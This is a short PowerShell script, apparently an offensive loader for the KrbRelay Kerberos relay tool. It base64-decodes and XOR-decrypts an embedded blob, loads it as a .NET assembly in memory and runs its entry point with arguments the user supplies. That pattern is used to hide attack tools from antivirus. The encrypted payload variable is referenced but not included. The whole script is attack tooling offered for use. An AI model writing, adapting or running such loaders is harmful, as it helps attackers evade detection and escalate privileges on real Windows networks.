function Load-XLdr_KrbRelay { param([Parameter ()] $xk = "0xe2")
$loadedAssembly = [AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.Fullname -eq "KrbRelay, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" }
if ($loadedAssembly) {
  return $loadedAssembly[0]  
}
$xk -eq "" -and ($xk = Read-Host "Specify XorKey")
$fb = [Convert]::FromBase64String($d75e65b5)
for($i=0; $i -lt $fb.count ; $i++) {$fb[$i] = $fb[$i] -bxor $xk}
$asm_XLdr_KrbRelay = [System.Reflection.Assembly]::Load($fb)
return $asm_XLdr_KrbRelay
}
function Invoke-XLdr_KrbRelay { param([Parameter ()] $Params = "")
$asm = Load-XLdr_KrbRelay
$Params -eq "" -and ($Params = Read-Host "Specify command arguments")
$asm.EntryPoint.Invoke($null, (, $Params.split()))
}